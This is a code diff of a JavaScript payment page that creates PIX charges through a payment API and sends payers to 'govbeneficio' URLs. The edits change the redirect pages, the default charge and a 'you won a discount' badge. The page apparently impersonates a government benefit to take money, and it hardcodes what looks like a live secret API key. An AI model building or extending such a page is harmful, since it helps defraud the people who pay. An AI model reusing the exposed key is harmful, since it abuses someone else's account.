@@ -187,16 +187,16 @@ var BLACKCAT_API_URL = 'https://api.blackcatpay.com.br/api';
 var BLACKCAT_API_KEY = 'sk_live_61ab2d43146721659324096a00d68c11f784242367a8469dae090c9ddf0c07d8';
 
 var redirectUrls = {
-    1320: 'https://govbeneficio.vercel.app/up4.html',
-    3582: 'https://govbeneficio.vercel.app/up4.html',
-    2790: 'https://govbeneficio.vercel.app/up4.html',
-    1320: 'https://govbeneficio.vercel.app/up4.html',
-    8500: 'https://govbeneficio.vercel.app/up4.html',
-    4560: 'https://govbeneficio.vercel.app/up4.html',
-    1825: 'https://govbeneficio.vercel.app/up4.html',
-    100:  'https://govbeneficio.vercel.app/up4.html'
+    6187: 'https://govbeneficio.vercel.app/up2.html',
+    3582: 'https://govbeneficio.vercel.app/up2.html',
+    2790: 'https://govbeneficio.vercel.app/up2.html',
+    1320: 'https://govbeneficio.vercel.app/up2.html',
+    8500: 'https://govbeneficio.vercel.app/up2.html',
+    4560: 'https://govbeneficio.vercel.app/up2.html',
+    1825: 'https://govbeneficio.vercel.app/up2.html',
+    100:  'https://govbeneficio.vercel.app/up2.html'
 };
-var DEFAULT_REDIRECT = 'https://govbeneficio.vercel.app/up4.html';
+var DEFAULT_REDIRECT = 'https://govbeneficio.vercel.app/up2.html';
 // =====================================================
 
 var _txid          = null;
@@ -328,8 +328,8 @@ async function copyPixCode() {
 function updateDiscountBadge() {
     var badge = document.getElementById('discountBadge');
     if (!badge) return;
-    if (_paymentAmount < 3582) {
-        badge.textContent = 'Você ganhou ' + Math.round((3582-_paymentAmount)/3582*100) + '% de desconto!';
+    if (_paymentAmount < 1320) {
+        badge.textContent = 'Você ganhou ' + Math.round((1320-_paymentAmount)/1320*100) + '% de desconto!';
         badge.classList.add('show');
     } else { badge.classList.remove('show'); }
 }
@@ -404,8 +404,8 @@ async function createPix() {
     var email    = getP('email') || randomEmail(cpf);
     var telefone = (getP('telefone') || getP('phone') || randomPhone()).replace(/\D/g,'');
     var valorRaw = getP('valor');
-    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 3582;
-    if (isNaN(valor) || valor <= 0) valor = 3582;
+    var valor    = valorRaw ? parseInt(valorRaw.replace(/\D/g,''),10) : 1320;
+    if (isNaN(valor) || valor <= 0) valor = 1320;
 
     var nomeEnvio = nome.trim();
     if (nomeEnvio.split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
